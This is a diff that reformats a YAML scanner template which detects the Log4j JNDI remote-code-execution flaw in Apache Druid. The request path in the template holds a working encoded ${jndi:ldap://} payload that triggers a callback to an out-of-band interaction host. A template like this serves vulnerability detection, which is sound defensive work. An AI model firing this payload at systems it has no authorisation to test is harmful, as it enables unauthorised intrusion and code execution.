@@ -1,5 +1,4 @@
 id: apache-druid-log4j-rce
-
 info:
   name: Apache Druid - Remote Code Execution (Apache Log4j)
   author: SleepingBag945
@@ -13,29 +12,26 @@ info:
     cpe: cpe:2.3:a:apache:druid:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
     max-request: 1
+    product: druid
+    shodan-query: title:"Apache Druid"
     vendor: apache
-  tags: cve,cve2021,rce,jndi,log4j,apache,druid,oast,kev,vuln
-
+    verified: true
+  tags: apache,cve,cve2021,druid,jndi,kev,log4j,oast,rce,vuln
 http:
-  - method: DELETE
-    path:
-      - "{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+  - matchers:
+      - part: interactsh_protocol
+        type: word
         words:
-          - "dns"
-
-      - type: word
-        part: header
+          - dns
+      - part: header
+        type: word
         words:
-          - "application/json"
-
-      - type: status
-        status:
+          - application/json
+      - status:
           - 404
-
+        type: status
+    matchers-condition: and
+    method: DELETE
+    path:
+      - '{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d'
